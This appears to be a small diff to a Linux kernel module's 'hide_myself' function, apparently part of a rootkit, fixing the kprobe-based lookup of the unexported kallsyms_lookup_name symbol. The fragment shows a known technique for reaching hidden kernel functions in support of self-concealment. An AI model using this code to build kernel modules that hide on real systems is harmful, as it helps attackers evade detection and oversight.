@@ -25,10 +25,8 @@ static void __init hide_myself(void)
 
 #ifdef KPROBE_LOOKUP
     unsigned long (*kallsyms_lookup_name)(const char *name);
-    int ret;
-    ret = register_kprobe(&kp);
-    if (ret < 0)
-        return ret;
+    if (register_kprobe(&kp) < 0)
+        return;
     kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
     unregister_kprobe(&kp);
 #endif
